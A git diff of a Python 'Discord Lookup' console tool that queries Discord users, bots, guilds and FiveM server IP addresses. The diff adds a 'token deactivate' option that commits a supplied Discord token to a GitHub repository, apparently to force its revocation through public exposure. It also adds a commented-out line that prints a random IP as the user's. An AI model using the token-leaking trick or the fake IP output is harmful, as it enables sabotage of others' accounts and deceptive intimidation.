@@ -1,5 +1,6 @@
 import requests
-import os, colorama, time, ctypes
+import os, colorama, time, ctypes, webbrowser, base64, random, getpass
+from github import Github
 from logger import debug, info, error, bridge, success
 from colorama import Fore
 
@@ -19,22 +20,36 @@ def snowflake_to_date(snowflake_id):
 colorama.init(autoreset=True)
 os.system("cls")
 
-print("\n".join(f"\033[38;2;255;{int(255 * i / 5)};0m{line}\033[0m" for i, line in enumerate([
+thisthing = "\n".join(f"\033[38;2;255;{int(255 * i / 5)};0m{line}\033[0m" for i, line in enumerate([
     '██████╗  ██████╗    ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗',
     '██╔══██╗██╔════╝    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗',
     '██║  ██║██║         ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝',
     '██║  ██║██║         ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝',
     '██████╔╝╚██████╗    ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║',
     '╚═════╝  ╚═════╝    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝'
-])) + "\033[0m")
+])) + "\033[0m"
+
+
+x = thisthing.center(40)
+
+print(x)
+
 ctypes.windll.kernel32.SetConsoleTitleW("Discord Lookup made by monokai <3")
 print(Fore.YELLOW + '╔══════════════════════════════╦══════════════════════════╦════════════════════════════════════════════╗')
 print(Fore.YELLOW + f'║                              ║{Fore.LIGHTYELLOW_EX}       MENU OPTIONS{Fore.RED}       ║                                            ║')
 print(Fore.YELLOW + '╠══════════════════════════════╬══════════════════════════╬════════════════════════════════════════════╣')
 print(Fore.RED + '║     [01] USER LOOKUP         ║     [02] BOT LOOKUP      ║     [03] GUILD LOOKUP                      ║')
 print(Fore.YELLOW + '╠══════════════════════════════╬══════════════════════════╬════════════════════════════════════════════╣')
-print(Fore.RED + '║     [04] CFX LOOKUP          ║     [05] SOON            ║     [06] EXIT                              ║')
+print(Fore.RED + '║     [04] CFX LOOKUP          ║   [05] TOKEN DEACTIVATE  ║     [06] EXIT                              ║')
 print(Fore.YELLOW + '╚══════════════════════════════╩══════════════════════════╩════════════════════════════════════════════╝')
+
+def add_file_to_repo(token, repo_name, file_path, file_content, commit_message):
+    g = Github(token)
+    repo = g.get_repo(repo_name)
+
+    contents = repo.get_contents(file_path)
+    repo.update_file(contents.path, commit_message, file_content, contents.sha)
+    success("successfully deactivated token!")
 
 def check_token_valid(token):
     r = requests.get('https://discord.com/api/v10/users/849566937846382614', headers={"Authorization": "Bot " + token})
@@ -44,9 +59,12 @@ def check_token_valid(token):
         error("Invalid token")
         exit()
 
-choice = input(Fore.LIGHTCYAN_EX + "> ")
+
+choice = input(f"""{Fore.RED} {Fore.RED}┌──({Fore.RED}{getpass.getuser()}@{os.environ['COMPUTERNAME']})─{Fore.RED}[{Fore.RED}~/monokaiidev/discord-lookup]
+ └─{Fore.RED}$ {Fore.RESET}""")
 
 if choice == '1':
+    ctypes.windll.kernel32.SetConsoleTitleW("User Lookup made by monokai <3")
     os.system("cls")
     try:
         with open('token.txt', 'r') as token_file:
@@ -65,12 +83,16 @@ if choice == '1':
         2: "Nitro",
         3: "Nitro Basic"
     }
+
+    def generate_random_ip():
+        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
+
     if request.status_code == 200:
         data = request.json()
         info(f"User Found!")
         print(" ")
         success("Username: " + (data["username"]) if data['username'] and data['username'] else 'No username')
-        success("Display Name: " + (data["global_name"]) if data['global_name'] and data['global_name'] else 'No display name')
+        success("Display Name: " + (data['global_name']) if data['global_name'] and data['global_name'] else 'Display Name: ' + data['username'])
         success("Created At: " + snowflake_to_date(data['id']).strftime('%Y-%m-%d %H:%M:%S'))
         # success("Discriminator: " + str(data["discriminator"]))
         success("ID: " + data["id"])
@@ -78,21 +100,18 @@ if choice == '1':
         # success("Banner: " + (data['banner'] if data['banner'] and data['banner'] else 'No banner'))
         success("Clan Tag: " + (data['clan']['tag'] if data['clan'] and data['clan']['tag'] else 'No clan'))
         success("Clan Guild ID: " + (data['clan']['identity_guild_id'] if data['clan'] and data['clan']['identity_guild_id'] else 'No clan guild ID'))
+        success("Banner Color: " + (data['banner_color'] if data['banner_color'] and data['banner_color'] else "No banner color"))
+        # success("IP Address: " + generate_random_ip() + " (close to your IP)") (FAKE)
         # success("Nitro: " + nitro_types[data['premium_type']])
     else:
         error(f"User Not Found!")
 elif choice == '2':
+    ctypes.windll.kernel32.SetConsoleTitleW("Bot Lookup made by monokai <3")
     os.system("cls")
-    try:
-        with open('token.txt', 'r') as token_file:
-            dc_auth = token_file.readline().strip()
-    except FileNotFoundError:
-        error("Token file not found. Please enter a token in the first line of token.txt")
-    check_token_valid(dc_auth)
     bridge("Getting API...")
     time.sleep(1)
     id = input(Fore.YELLOW + "[DISCORD LOOKUP] " + Fore.WHITE + "Enter Bot ID: ")
-    request = requests.get(f'https://canary.discord.com/api/v10/applications/{id}/rpc', headers={"Authorization": "Bot " + dc_auth, "Content-Type": "application/json"})
+    request = requests.get(f'https://canary.discord.com/api/v10/applications/{id}/rpc')
     if request.status_code == 200:
         info("Bot found!")
         print(" ")
@@ -107,6 +126,7 @@ elif choice == '2':
             success("Verified: No")
 
 elif choice == '3':
+    ctypes.windll.kernel32.SetConsoleTitleW("Guild Lookup made by monokai <3")
     try:
         with open('token.txt', 'r') as token_file:
             dc_auth = token_file.readline().strip()
@@ -133,6 +153,7 @@ elif choice == '3':
     else:
         error(f"The guild is either non-existant, unavailable, or has Server Widget/Discovery disabled.")
 elif choice == '4':
+    ctypes.windll.kernel32.SetConsoleTitleW("CFX Lookup made by monokai <3")
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
         "Accept-Language": "en-US,en;q=0.5",
@@ -155,3 +176,30 @@ elif choice == '4':
         success("IP: " + data['Data']['connectEndPoints'][0])
     else:
         error("not found")
+elif choice == '5':
+    bridge("Getting GitHub..")
+    bridge("Repository: TokenDeactivate. Correct? [Y/N]")
+    inputthis = input("> ")
+    if inputthis.upper() == 'Y':
+        tokeninput = input(Fore.LIGHTYELLOW_EX + "[MONOKAI]" + Fore.WHITE + " Enter Token to deactivate: ")
+        repo_name = "yourname/repo"
+        file_path = "your_file_name.txt"
+        commit_message = "token"
+        file_content = f"TOKEN | {tokeninput} | DISCORD LOOKUP BY MONOKAI"
+        github_token = "TOKEN_HERE"
+        add_file_to_repo(github_token, repo_name, file_path, file_content, commit_message)
+
+    else:
+        success("Exiting...")
+        exit(1)
+elif choice == '6':
+    ctypes.windll.kernel32.SetConsoleTitleW("User Lookup made by monokai <3")
+    os.system("cls")
+    print(Fore.LIGHTYELLOW_EX + "[DISCORD LOOKUP] " + Fore.WHITE + "Credits: Monokai")
+    yN = input(Fore.LIGHTYELLOW_EX + "[DISCORD LOOKUP]" + Fore.WHITE + " Do you want to open my GitHub in the Browser? [Y/N] ")
+
+    if yN == 'Y'.upper():
+        webbrowser.open("https://github.com/monokaiidev")
+    else:
+        success("Exiting...")
+        exit(1)
